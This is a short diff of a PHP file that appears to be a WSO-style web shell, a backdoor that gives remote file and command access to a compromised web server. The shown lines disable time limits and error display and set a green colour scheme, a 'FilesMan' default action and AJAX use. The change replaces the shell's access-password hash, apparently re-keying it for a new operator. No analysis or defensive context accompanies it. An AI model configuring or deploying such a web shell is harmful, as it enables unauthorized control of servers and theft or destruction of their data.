@@ -14,7 +14,7 @@ set_time_limit(0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
 
-$password 			= "6a44a56d41aced5e77ae16e7b54971fa";
+$password 			= "5c2e5b676795202dd6e2e8f3e231e5ee";
 $color 				= "#00ff00";
 $default_action 	= 'FilesMan';
 $default_use_ajax 	= true;
